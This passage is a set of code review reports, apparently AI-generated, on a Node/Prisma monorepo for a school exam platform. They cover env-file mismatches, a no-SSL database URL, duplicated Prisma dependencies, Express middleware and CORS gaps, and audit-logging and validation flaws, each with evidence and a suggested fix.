*   **Evidence:** `FILE 1` (.env.example) mandates `SUPABASE_URL`, `ONESIGNAL_APP_ID`, `SENTRY_DSN`, and `NEXTAUTH_SECRET`. `FILE 2` (.env.local) is missing **all** of these but contains numerous `POSTGRES` and `NEON` variables not defined in the example.
*   **Why:** The template (example) and the actual implementation (local) are diverged. This indicates that either the documentation is obsolete or the local environment is critically under-configured for the application's feature set.
*   **Failure Scenario:** A developer spinning up the project using the example will fail to connect to the database (missing `DATABASE_URL`), while the application will crash at runtime when attempting to initialize NextAuth or OneSignal due to missing keys in the active `.env.local`.
*   **Fix Strategy:** Synchronize the `.env.example` to reflect the actual required variables (Postgres/Neon). Ensure all mandatory functional keys defined in the example are present in the local configuration.

#### **Issue 4: Insecure Database Connection Option**
*   **Evidence:** `FILE 2` defines `POSTGRES_URL_NO_SSL` which points to the pooler endpoint without the `sslmode=require` parameter.
*   **Why:** Cloud databases like Neon require SSL for security. Providing an explicit "No SSL" connection string encourages insecure data transmission.
*   **Failure Scenario:** A developer accidentally uses the `NO_SSL` variable in a script or service, leading to data being transmitted in plain text over the internet, susceptible to Man-in-the-Middle (MITM) interception.
*   **Fix Strategy:** Remove the `POSTGRES_URL_NO_SSL` variable entirely. Enforce SSL at the application/ORM level for all connection strings.

#### **Issue 5: Missing Security Secret (NEXTAUTH_SECRET)**
*   **Evidence:** `FILE 1` lists `NEXTAUTH_SECRET` as a requirement, but it is absent from `FILE 2`.
*   **Why:** NextAuth requires a secret to sign and encrypt cookies/tokens. Without it, the authentication system is either insecure or non-functional.
*   **Failure Scenario:** In a production-like environment, NextAuth will throw a `NEXTAUTH_URL` or `NO_SECRET` error, preventing all user logins and blocking access to protected routes.
*   **Fix Strategy:** Generate a cryptographically strong secret and add it to the local environment configuration to enable secure session handling.


---

### Forensic Analysis Report: `apps/api`

#### 1. Issue: Redundant and Conflicting Prisma Client Dependencies
- **Evidence**: 
    - `apps/api/package.json` (Lines 17, 43): `@prisma/client: ^5.22.0` and `prisma: ^5.22.0`.
    - `apps/api/package-lock.json` (Line 49): `../../packages/db` also declares `@prisma/client: ^5.22.0`.
- **Why**: In a monorepo architecture, Prisma should have a single source of truth. Duplicating these dependencies across the consuming app (`api`) and the provider package (`db`) creates multiple `node_modules/.prisma` directories and multiple binary engine instances.
- **Failure Scenario**: Runtime errors such as "Too many open connections" (as each client maintains its own pool) or `instanceof` check failures when catching Prisma errors, as the classes originate from different physical file locations.
- **Fix Strategy**: Remove `@prisma/client` and `prisma` from `apps/api/package.json`. Use the `db` package as the sole gateway for database interactions and type definitions.

#### 2. Misaligned Prisma Client Generation Target
- **Issue**: The API generates the Prisma Client locally, but the source code attempts to import it from the shared `db` package.
- **Evidence**:
    - `apps/api/package.json` (Line 8): `"prebuild": "npx prisma generate --schema ../../packages/db/schema.prisma"`.
    - `apps/api/src/config/database.ts` (Line 3): `import { prisma } from 'db';`.
- **Why**: Executing `prisma generate` inside `apps/api` outputs the client to `apps/api/node_modules/.prisma/client`. However, `database.ts` imports from the `db` package. There is no link ensuring the `db` package exports the client generated within the `api` scope.
- **Failure Scenario**: `tsc` (TypeScript compiler) will fail during `npm run build` because the `db` package likely lacks a valid export for `prisma` unless it was independently generated within the `packages/db` directory.
- **Fix Strategy**: Centralize the `prisma generate` command within the `packages/db` lifecycle. The API should trigger the generation in the shared package rather than generating its own local copy.

#### 3. Production Dependency Leak (Type Definitions)
- **Issue**: `@types/nodemailer` is incorrectly categorized as a production dependency.
- **Evidence**:
    - `apps/api/package.json` (Line 20): `"@types/nodemailer": "^7.0.5"` is located in the `dependencies` block.
- **Why**: Type definitions (`@types/*`) are development-time artifacts used by TypeScript for static analysis. They are not required for execution in the compiled `dist/index.js` environment.
- **Failure Scenario**: Unnecessary bloat in production `node_modules`, leading to longer deployment times and increased cold-start latency in serverless environments (referenced by `vercel.json` in the file tree).
- **Fix Strategy**: Relocate `@types/nodemailer` to the `devDependencies` block.

#### 4. Brittle Monorepo Resolution via `file:` Protocol
- **Issue**: The use of `file:../../packages/db` for internal dependencies without workspace orchestration.
- **Evidence**:
    - `apps/api/package.json` (Line 25): `"db": "file:../../packages/db"`.
- **Why**: Simple `file:` references often result in physical copies of the package rather than symlinks (depending on the npm version and OS). This breaks the singleton nature of the Prisma Client and leads to duplicated sub-dependencies.
- **Failure Scenario**: Changes made to `packages/db/schema.prisma` are not reflected in `apps/api` until a full `npm install` is re-run, causing "out of sync" schema errors at runtime.
- **Fix Strategy**: Implement a formal monorepo workspace (e.g., NPM Workspaces) to handle package linking and dependency hoisting correctly.

#### 5. Implicit Dependency on Unbuilt Code
- **Issue**: `src/config/database.ts` assumes the `db` package is pre-compiled, but the `api` build script does not ensure this.
- **Evidence**:
    - `apps/api/src/config/database.ts` (Line 3): `import { prisma } from 'db';`.
    - `apps/api/package.json` (Line 9): `"build": "npx --no-install tsc"`.
- **Why**: If `packages/db` has not been compiled to JavaScript or its types haven't been generated, the `api` build process will fail immediately during the `tsc` phase.
- **Failure Scenario**: Clean CI/CD builds will fail because the API tries to compile before its local dependency (`db`) has established its own `dist` or generated client types.
- **Fix Strategy**: Update the `build` script to a recursive build pattern (e.g., `npm run build --workspace db && tsc`) or use a build orchestrator.


---

Based on a forensic analysis of the provided files, here is the identification of issues:

### **FILE 1: index.minimal.ts (Critical Deficiencies)**

1. **Issue:** **Incomplete Request Body Processing**
   - **Evidence:** The file lacks any `express.json()` or `express.urlencoded()` middleware.
   - **Why:** Express does not parse request bodies by default. Without this middleware, the API cannot read data sent in POST, PUT, or PATCH requests.
   - **Failure Scenario:** Any request attempting to send JSON data will result in `req.body` being `undefined`, causing downstream logic to crash or fail to process input.
   - **Fix Strategy:** Implement standard body-parsing middleware before route definitions.

2. **Issue:** **Zero Security Hardening**
   - **Evidence:** Absence of `helmet`, `cors`, or rate-limiting middleware.
   - **Why:** Production APIs require protection against common web vulnerabilities (XSS, Clickjacking) and Cross-Origin Resource Sharing control.
   - **Failure Scenario:** The API is vulnerable to header-based attacks, and browser-based frontends will be blocked by default CORS policies.
   - **Fix Strategy:** Integrate `helmet` for security headers and `cors` to manage cross-origin access.

3. **Issue:** **Hybrid Module Export Conflict**
   - **Evidence:** Line 2: `import express ...` (ESM) vs Line 38: `module.exports = app;` (CommonJS).
   - **Why:** Mixing ESM `import` and CJS `module.exports` in a TypeScript file can lead to compilation errors or unexpected behavior depending on the `tsconfig` configuration.
   - **Failure Scenario:** The Vercel deployment or local build process may fail to correctly resolve the entry point or throw "module is not defined" errors in strict ESM environments.
   - **Fix Strategy:** Standardize on ESM `export default` syntax.

---

### **FILE 2: index.ts (Implementation Errors)**

1. **Issue:** **Critical Truncation (Syntax Failure)**
   - **Evidence:** Line 116: `app.use('/api/use`.
   - **Why:** The file ends abruptly mid-statement.
   - **Failure Scenario:** The application will fail to boot entirely due to a syntax error (unclosed string/function call), preventing any routes from being mounted.
   - **Fix Strategy:** Complete the route mounting logic and properly close the application configuration.

2. **Issue:** **Premature Dependency Initialization**
   - **Evidence:** `PrismaClient` (Line 48) and `webSocketService` (Line 9) are initialized/imported **before** `dotenv.config()` (Line 55).
   - **Why:** Environment variables (like `DATABASE_URL`) are not loaded into `process.env` until `dotenv.config()` is called.
   - **Failure Scenario:** Prisma may fail to find the connection string, or the WebSocket service may initialize with incorrect ports/settings, causing immediate startup crashes.
   - **Fix Strategy:** Relocate `dotenv.config()` to the very top of the entry file, before any local service or client imports.

3. **Issue:** **Fragile CORS Logic**
   - **Evidence:** `if (allowedOrigins.indexOf(origin) === -1)` (Line 72).
   - **Why:** If `CORS_ALLOWED_ORIGINS` is missing, `allowedOrigins` is an empty array.
   - **Failure Scenario:** All browser-based requests (which provide an `origin`) will be rejected with an Error, rendering the API unusable for the frontend.
   - **Fix Strategy:** Implement a default fallback or permit specific development origins when environment variables are missing.

---

### **FILE 3: index.ts.broken (Structural Failures)**

1. **Issue:** **Undefined Middleware & Routings**
   - **Evidence:** `helmet()`, `cors()`, `generalRateLimit`, `requireJWTSecret`, `xssSanitize`, and all routers (e.g., `authRouter`) are used but **never imported or defined**.
   - **Why:** JavaScript/TypeScript will throw a `ReferenceError` for any identifier used before declaration or import.
   - **Failure Scenario:** The server will crash immediately upon execution because none of the core middleware or route handlers exist in the script's scope.
   - **Fix Strategy:** Add all necessary `import` statements for every middleware function and route controller used in the file.

2. **Issue:** **Mixed Module Resolution Styles**
   - **Evidence:** Mix of `import` (Line 1), `require` (Line 60), and `module.exports` (Line 63).
   - **Why:** Inconsistent module usage creates "poisoned" environments where build tools (like `tsc` or `webpack`) cannot reliably resolve dependencies.
   - **Failure Scenario:** The application may fail to bundle, or the `require` call might fail if `errorHandler.ts` is written in ESM without proper interop.
   - **Fix Strategy:** Standardize the entire file to use ESM `import` and `export default`.

3. **Issue:** **Insecure CORS Fallback Configuration**
   - **Evidence:** `origin: process.env.NODE_ENV === 'production' ? [...] : true`.
   - **Why:** Setting `origin: true` reflects the request's origin back in the `Access-Control-Allow-Origin` header.
   - **Failure Scenario:** While convenient for dev, it effectively disables origin validation, allowing any malicious site to make authenticated requests to the API if credentials are enabled.
   - **Fix Strategy:** Use an explicit whitelist for development origins rather than a blind reflection.


---

### Forensic Static Analysis Report

#### 1. Critical Failure in Security Event Logging
*   **Issue:** Pre-authentication security events (like failed logins) are silently discarded.
*   **Evidence:** `logAudit` returns early if `finalSchoolId` is null (`auditLog.ts`, line 26). `logSecurityEvent` relies on `req.user.schoolId` to provide this value (`auditLog.ts`, line 60), which is `undefined` before a user logs in.
*   **Why:** The logging logic mandates a tenant context (`schoolId`) for all entries, but security events often occur before a tenant context can be established.
*   **Failure Scenario:** An attacker performs a brute-force attack on the login endpoint. Since no user is authenticated, `finalSchoolId` is null. The system fails to log the `SECURITY_FAILED_LOGIN` event, leaving the platform blind to the ongoing attack.
*   **Fix Strategy:** Allow a "SYSTEM" level tenant ID or make `schoolId` optional specifically for security-type logs.

#### 2. Password Complexity Inconsistency
*   **Issue:** Divergent validation rules for the same data type (passwords).
*   **Evidence:** `LoginSchema` requires `min(6)` (`validation.ts`, line 7), whereas `RegisterSchema` requires `min(8)` (`validation.ts`, line 13).
*   **Why:** Lack of a centralized security policy for credential requirements.
*   **Failure Scenario:** A user registers with an 8-character password. If the registration requirement is later raised but the login check remains at 6, it creates a fragmented security posture where legacy or "weak" checks exist in different parts of the auth flow, complicating maintenance and auditing.
*   **Fix Strategy:** Define a single, shared Zod schema for passwords and reuse it in both Login and Registration schemas.

#### 3. Role Definition Desynchronization
*   **Issue:** The validation layer is unaware of valid database roles.
*   **Evidence:** `database.ts` defines `Role` with 6 members (line 4). `InviteSchema` in `validation.ts` (line 21) hardcodes a subset of only 3 roles: `['ADMIN', 'TEACHER', 'STUDENT']`.
*   **Why:** Manual duplication of enum values into Zod schemas creates a maintenance "split-brain" where the API rejects valid database roles.
*   **Failure Scenario:** A Super Admin attempts to invite a `SCHOOL_ADMIN` or a `PARENT`. The API throws a validation error because these roles, while valid in the database, are missing from the hardcoded list in the validation schema.
*   **Fix Strategy:** Dynamically generate the Zod enum values directly from the `Role` TypeScript enum.

#### 4. Type Safety Erosion via `any`
*   **Issue:** Use of "unsafe" types in core database interfaces.
*   **Evidence:** `DatabaseExam.questions` is typed as `any[]` (`database.ts`, line 46).
*   **Why:** Bypassing the type system for complex JSON structures leads to a total loss of compiler protection for the most critical part of the exam system.
*   **Failure Scenario:** A developer updates the question format to use `title` instead of `text`. The compiler does not flag existing code accessing `.text` because of the `any` type. Students experience runtime crashes when trying to load exam questions.
*   **Fix Strategy:** Define a formal `Question` interface and apply it to the `DatabaseExam` definition.

#### 5. Database Performance Risk (Blocking Cleanup)
*   **Issue:** Potential table locking during audit log maintenance.
*   **Evidence:** `cleanupOldAuditLogs` performs an unbounded `deleteMany` (`auditLog.ts`, line 91).
*   **Why:** Deleting a large volume of rows in a single transaction can lock the table and bloat the transaction log in relational databases.
*   **Failure Scenario:** On a high-traffic system, the cleanup task attempts to delete 1,000,000 old records at once. The `auditLog` table locks for several seconds, causing all concurrent user actions (login, page views) that trigger a log to hang or timeout.
*   **Fix Strategy:** Implement batching to delete records in smaller chunks (e.g., 5,000 at a time) with short pauses to allow other operations to proceed.

#### 6. Information Leakage in Validation Errors
*   **Issue:** Technical implementation details are exposed to the client.
*   **Evidence:** The `validate` utility returns the raw `z.ZodError.message` (`validation.ts`, line 51).
*   **Why:** Zod error messages are verbose and contain internal schema paths and field names.
*   **Failure Scenario:** An attacker sends a malformed request and receives a detailed error path identifying internal field names or schema structures. This information helps the attacker craft more precise injection or data-probing attacks.
*   **Fix Strategy:** Transform Zod errors into a sanitized, user-friendly format that hides internal schema paths.

#### 7. Audit Action Type Safety Bypass
*   **Issue:** The `AuditLogAction` enum is defined but never enforced.
*   **Evidence:** `database.ts` defines `AuditLogAction` (line 14), but `logAudit` accepts a generic `action: string` (`auditLog.ts`, line 18).
*   **Why:** Failure to integrate the domain model into the utility functions designed to support it.
*   **Failure Scenario:** A developer logs `USER_LOGGED_IN` instead of the enum-defined `USER_LOGIN`. Reports or dashboards filtering by the enum value will miss these entries, leading to inaccurate compliance or usage data.
*   **Fix Strategy:** Update the `action` parameter in `logAudit` to strictly require the `AuditLogAction` enum type.

#### 8. Unhandled Exception in Log Serialization
*   **Issue:** Potential for silent failure during log creation.
*   **Evidence:** `JSON.stringify(details)` is called inside `logAudit` (`auditLog.ts`, line 35) without validation of the `details` object.
*   **Why:** If `details` contains a circular reference or a non-serializable type (like `BigInt`), `JSON.stringify` will throw an error.
*   **Failure Scenario:** A developer passes a complex database object with circular relations to `logAudit`. The serialization fails, and although the error is caught, the audit log is never created, losing critical forensic data without alerting the system.
*   **Fix Strategy:** Use a safe-serialization utility that handles circular references or strictly type the `details` parameter.


---

